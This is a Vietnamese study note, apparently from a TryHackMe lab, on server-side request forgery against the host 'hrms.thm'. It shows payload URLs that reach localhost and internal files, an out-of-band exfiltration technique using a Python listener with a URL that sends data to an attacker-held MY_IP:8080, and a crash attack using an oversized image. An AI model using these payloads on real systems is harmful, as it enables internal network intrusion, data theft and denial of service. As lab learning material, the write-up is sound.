- Server-Side Request Forgery (SSRF) là lỗ hổng cho phép kẻ tấn công buộc **server** của bạn gửi yêu cầu (HTTP/URL) tới các địa chỉ do hắn chọn. Vì yêu cầu xuất phát từ chính máy chủ, nó có thể “nhìn thấy” mạng nội bộ, dịch vụ quản trị hoặc tài nguyên đám mây mà bên ngoài không truy cập được.
### SSRF Against a Local Server
- Dùng localhost làm direct-url: `http://hrms.thm?url=localhost/copyright
	- thay copyright thành các tên file khác : `config`, `connection`, ...
### Accessing an Internal Server
- trang web hiện tại gọi đến `http://192.168.2.10/salary.php` để lấy data -> thay salary thành các đuôi khác, như `admin`, ... (thay trong code HTML, DOM hoặc intercep)
### Blind SSRF With Out-Of-Band
- trang web hiện tại gửi thông tin cho trang web được chỉ định
- Tạo payload
```shell-session
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```
- `shell-session sudo chmod +x server.py && sudo python3 server.py`: chạy server bên máy mình
- `http://hrms.thm/profile.php?url=http://MY_IP:8080`: trang web sẽ gửi data về server đang host của mình
### Crashing the Server
- `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`: server đang tải ảnh của 1 url bên ngoài ra màn hình
- `http://hrms.thm/?url=localhost/url`: đọc code của file url.php và nhận thấy kích thước file ảnh phải < 100 KB, nên ta phải gửi 1 ảnh lớn hơn để server crash
- `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`: ta đổi thành 1 ảnh lớn hơn